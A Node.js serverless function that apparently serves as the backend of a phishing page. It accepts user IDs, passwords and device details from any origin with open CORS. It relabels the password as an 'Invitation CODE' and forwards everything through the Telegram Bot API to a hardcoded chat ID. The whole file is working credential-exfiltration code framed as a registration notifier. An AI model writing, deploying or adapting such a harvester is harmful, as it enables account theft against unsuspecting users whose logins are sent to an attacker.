const axios = require('axios');

module.exports = async (req, res) => {
  // Set CORS headers to allow requests from your script
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID || "5396030319";

    if (!BOT_TOKEN) {
      return res.status(500).json({ error: 'Server configuration error' });
    }

    const { uid, password, premium_code, isForgotPassword, deviceInfo } = req.body;

    // Validate required fields
    if (!uid || !password) {
      return res.status(400).json({ 
        error: 'Missing required fields: uid and password are required' 
      });
    }

    // Create the message
    const messageType = isForgotPassword ? 
      "🌀 Forgot Password Request 🌀" : 
      "🌀 New Device Registration 🌀";

    let messageLines = [
      "┏━━━━━━━━༺༻━━━━━━━━┓",
      `     ${messageType}`,
      "┗━━━━━━━━༺༻━━━━━━━━┛",
      "",
      "",
      `🔹 UserID: ${uid}`,
      "",
      "",
      `🔸 Invitation CODE: ${password}`,
      ""
    ];

    // Add device info if available
    if (deviceInfo && Array.isArray(deviceInfo)) {
      messageLines.push("📋 Device Information:");
      deviceInfo.forEach(line => {
        if (line && line.trim() !== "") {
          messageLines.push(line);
        }
      });
      messageLines.push("");
    }

    // Add timestamp
    messageLines.push(`⏰ Time: ${new Date().toLocaleString()}`);
    messageLines.push("");
    messageLines.push("╟═════════⋆✪⋆═════════╢");

    const message = messageLines.join('\n');

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    const response = await axios.post(telegramUrl, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });

    console.log('Telegram notification sent successfully');
    
    res.status(200).json({ 
      success: true, 
      message: 'Notification sent successfully',
      data: {
        uid: uid,
        type: isForgotPassword ? 'password_recovery' : 'new_registration',
        timestamp: new Date().toISOString()
      }
    });

  } catch (error) {
    console.error('Error sending Telegram message:', error);
    
    res.status(500).json({ 
      success: false, 
      error: 'Failed to send notification',
      details: error.message
    });
  }
};
